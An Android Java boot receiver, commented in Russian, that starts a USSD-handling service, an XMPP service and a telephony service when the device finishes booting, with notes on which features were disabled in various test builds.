package com.codedemigod.receivers;

import com.codedemigod.services.CDUSSDService;
import com.heatclub.moro.xmpp.XMPPService;
import com.heatclub.moro.telephony.CallService;
import com.heatclub.moro.action.ActionManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class CDBootCompleteRcv extends BroadcastReceiver {
	private String TAG = CDBootCompleteRcv.class.getSimpleName();
	
	@Override
	public void onReceive(Context context, Intent intent) {
		//инициализация приложения
		
		Log.i(TAG, "rcvd boot event, launching service");
		//Запустить службу перехватывающую USSD запросы
		//test2 без ussd
		//test3 без xmpp
		//test4 без телефонии
		//test5 отключено все
		//test6 инициализация в активити
		//test7  включен sendReply
		//test8 все отключено
		Intent ussdIntent = new Intent(context, CDUSSDService.class);
		context.startService(ussdIntent);
		//Запустить XMPP службу
		Intent xmppIntent = new Intent(context, XMPPService.class);
		context.startService(xmppIntent);
		//Запустить службу телефонии
		Intent telIntent = new Intent(context, CallService.class);
		context.startService(telIntent);	
	
		//ActionManager.sendReply(context, "[Инициализация окончена]");
		
	}

}
